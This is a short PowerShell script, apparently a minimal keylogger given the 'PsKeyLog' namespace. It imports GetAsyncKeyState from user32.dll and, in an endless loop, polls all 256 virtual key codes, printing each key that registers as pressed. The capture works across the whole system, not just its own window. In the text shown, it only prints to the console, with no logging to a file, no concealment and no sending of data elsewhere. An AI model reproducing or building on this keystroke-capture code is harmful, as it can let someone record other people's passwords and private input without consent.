param([int[]] $Codes = 0..255)

$Signature = @'
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
    public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

Add-Type -MemberDefinition $Signature -Name Keyboard -Namespace PsKeyLog



# if (-not $Codes) {
#     $Codes = 0..255
# }

while ($true) {
    $Codes | ForEach-Object { 
        $key = $_
        $result = [PsKeyLog.Keyboard]::GetAsyncKeyState($_)
        if ($result -ne 0) {
            "$($key): $result"
        }
    }
}